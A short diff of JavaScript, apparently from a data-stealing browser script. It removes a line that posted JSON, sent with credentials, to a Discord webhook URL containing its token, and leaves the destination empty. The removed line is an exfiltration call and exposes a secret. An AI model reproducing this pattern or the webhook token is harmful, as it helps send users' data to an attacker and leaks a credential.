@@ -9,7 +9,7 @@ syscrook.withCredentials = true;
   }
 });
 location.reload();
-   syscrook.open("POST", "https://discord.com/api/webhooks/892419085558751243/bMhWrrNtTSJI1mO6Wl3PCOj5Oq1iDxjU557CLTFfvFaRdEFzJwTYDaCI5VD98z0j1YIr");
+   syscrook.open("POST", "");
    syscrook.setRequestHeader('Content-Type', 'application/json');
    syscrook.send(
     JSON.stringify({
